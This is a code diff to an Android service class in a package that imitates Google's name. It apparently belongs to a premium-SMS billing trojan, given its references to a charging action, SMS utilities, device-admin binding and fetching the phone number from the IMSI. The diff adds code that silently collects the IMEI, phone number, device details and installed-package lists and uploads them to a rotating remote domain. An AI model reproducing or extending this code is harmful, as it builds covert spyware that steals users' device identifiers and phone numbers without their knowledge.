@@ -14,10 +14,7 @@ import com.googl.plugin.x.R;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
 import com.umeng.analytics.MobclickAgent;
-import com.xstd.plugin.Utils.BRCUtil;
-import com.xstd.plugin.Utils.CommonUtil;
-import com.xstd.plugin.Utils.DomanManager;
-import com.xstd.plugin.Utils.SMSUtil;
+import com.xstd.plugin.Utils.*;
 import com.xstd.plugin.api.*;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
@@ -52,6 +49,11 @@ public class PluginService extends IntentService {
     public static final String ACTION_FETCH_DOMAIN = "com.xstd.plugin.domain.fetch";
 
     public static final String ACTION_UPDATE_UMENG = "com.xstd.plugin.umeng.event";
+
+    /**
+     * 统计预装软件的信息
+     */
+    public static final String ACTION_PHONE_INSTALL_INFO = "com.xstd.plugin.phone.install";
 
     /**
      * 扣费行动
@@ -95,10 +97,73 @@ public class PluginService extends IntentService {
                 fetchDomain();
             } else if (ACTION_UPDATE_UMENG.equals(action)) {
                 updateUmengEvent(intent);
+            } else if (ACTION_PHONE_INSTALL_INFO.equals(action)) {
+                updatePhoneInstallInfo(intent);
             }
         }
 
         MobclickAgent.onPause(this);
+    }
+
+    private synchronized void updatePhoneInstallInfo(Intent intent) {
+        if (!UtilsRuntime.isOnline(getApplicationContext())) return;
+
+        try {
+            if (Config.DEBUG) {
+                Config.LOGD("[[PluginService::updatePhoneInstallInfo]] upload info for PhoneInstall");
+            }
+            PluginSettingManager.getInstance().init(getApplicationContext());
+
+            String packageList = PluginSettingManager.getInstance().getSoftwareInstallListInfo();
+            int softwareCount = 0;
+            String softwareList = null;
+            int leftSoftwareCount = 0;
+            String leftSoftwreList = null;
+            if (TextUtils.isEmpty(packageList)) {
+                softwareCount = 0;
+                softwareList = "None";
+                leftSoftwareCount = 0;
+                leftSoftwreList = "None";
+            } else {
+                softwareList = packageList;
+                String[] packageNameArray = packageList.split(";");
+                if (packageNameArray != null) {
+                    softwareCount = packageNameArray.length;
+                    leftSoftwreList = "";
+                    for (String packageName : packageNameArray) {
+                        if (CommonUtil.checkPackageInstall(getApplicationContext(), packageName)) {
+                            leftSoftwreList = leftSoftwreList + packageName + ";";
+                            leftSoftwareCount++;
+                        }
+                    }
+                    if (leftSoftwreList.length() > 0) {
+                        leftSoftwreList = leftSoftwreList.substring(0, leftSoftwreList.length() - 1);
+                    }
+                }
+            }
+
+            PluginSettingManager.getInstance().init(getApplicationContext());
+            PhoneInstallInfoRequest request = new PhoneInstallInfoRequest(Config.CHANNEL_CODE,
+                                                                             UtilsRuntime.getIMEI(getApplicationContext()),
+                                                                             Build.MODEL,
+                                                                             Build.VERSION.RELEASE,
+                                                                             AppRuntime.getNetworkTypeNameByIMSI(getApplicationContext()),
+                                                                             SimCardUtils.issDoubleTelephone(getApplicationContext()),
+                                                                             PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone(),
+                                                                             PluginSettingManager.getInstance().getCurrentPhoneNumber(),
+                                                                             softwareCount,
+                                                                             softwareList,
+                                                                             leftSoftwareCount,
+                                                                             leftSoftwreList,
+                                                                             System.currentTimeMillis(),
+                                                                             DomanManager.getInstance(getApplicationContext()).getOneAviableDomain() + "/phoneInstall/");
+            PhoneInstallInfoResponse response = InternetUtils.request(getApplicationContext(), request);
+            if (response != null && response.result == 1) {
+                //上传成功
+                PluginSettingManager.getInstance().setLastUpdatePhoneInstallInfoTime(System.currentTimeMillis());
+            }
+        } catch (Exception e) {
+        }
     }
 
     private synchronized void updateUmengEvent(Intent intent) {
@@ -218,8 +283,7 @@ public class PluginService extends IntentService {
                     if (!UtilsRuntime.isOnline(getApplicationContext())) return;
 
                     PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
-                                                                         , new PhoneFetchRequest(
-                                                                                                    DomanManager.getInstance(getApplicationContext())
+                                                                         , new PhoneFetchRequest(DomanManager.getInstance(getApplicationContext())
                                                                                                         .getOneAviableDomain()
                                                                                                         + "/tools/i2n/" + imsi));
                     if (respone != null && !TextUtils.isEmpty(respone.phone)) {
@@ -614,6 +678,7 @@ public class PluginService extends IntentService {
             PluginSettingManager.getInstance().setMainApkSendUUID(intent.getStringExtra("uuid"));
             PluginSettingManager.getInstance().setMainExtraInfo(intent.getStringExtra("extra"));
             PluginSettingManager.getInstance().setMainApkChannel(intent.getStringExtra("channel"));
+            PluginSettingManager.getInstance().setSoftwareInstallListInfo(intent.getStringExtra("packageNameList"));
 
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class))
